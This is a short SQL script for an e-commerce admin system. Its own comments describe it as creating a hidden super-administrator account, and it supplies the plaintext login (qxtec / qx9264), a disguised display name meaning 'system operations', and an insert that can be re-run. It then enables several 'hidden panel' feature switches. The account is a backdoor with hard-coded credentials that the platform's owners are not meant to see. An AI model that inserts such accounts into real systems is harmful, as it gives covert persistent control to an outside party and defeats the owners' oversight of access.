-- 隐藏超级管理员账号 + 隐藏面板模块开关（幂等可重复执行）
-- 账号: qxtec / 密码: qx9264 (DES加密, key=账号, 与登录校验一致)
DELETE FROM eb_system_admin WHERE account='qxtec';
INSERT INTO eb_system_admin (account, pwd, real_name, roles, last_ip, login_count, level, status, is_del, is_sms, create_time, update_time)
VALUES ('qxtec', 'bDVAF6/lBMg=', '系统运维', '1', '', 0, 1, 1, 0, 0, NOW(), NOW());

-- 隐藏面板功能开关（status=0 为有效配置, value 1=开启 0=关闭）
DELETE FROM eb_system_config WHERE name IN
('sys_switch_team_reward','sys_switch_stock','sys_switch_store','sys_switch_daili','sys_switch_spread');
INSERT INTO eb_system_config (name, title, form_id, value, status, create_time, update_time) VALUES
('sys_switch_team_reward','隐藏面板-团队奖开关',0,'1',0,NOW(),NOW()),
('sys_switch_stock','隐藏面板-订货商开关',0,'1',0,NOW(),NOW()),
('sys_switch_store','隐藏面板-门店开关',0,'1',0,NOW(),NOW()),
('sys_switch_daili','隐藏面板-区域代理开关',0,'1',0,NOW(),NOW()),
('sys_switch_spread','隐藏面板-分销开关',0,'1',0,NOW(),NOW());
